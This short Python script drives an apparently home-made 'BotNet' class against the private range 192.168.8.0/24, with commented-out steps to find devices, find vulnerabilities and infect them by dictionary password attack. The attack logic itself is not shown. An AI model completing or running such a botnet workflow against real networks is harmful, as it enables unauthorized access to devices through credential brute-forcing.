from Bot import BotNet

if __name__ == '__main__':
    b = BotNet.BotNet(networks=["192.168.8.0/24"])

    """Scan"""
    # b.findDevices()
    # b.findVulnerabilities()

    """Infection"""
    # b.dictionaryAttack()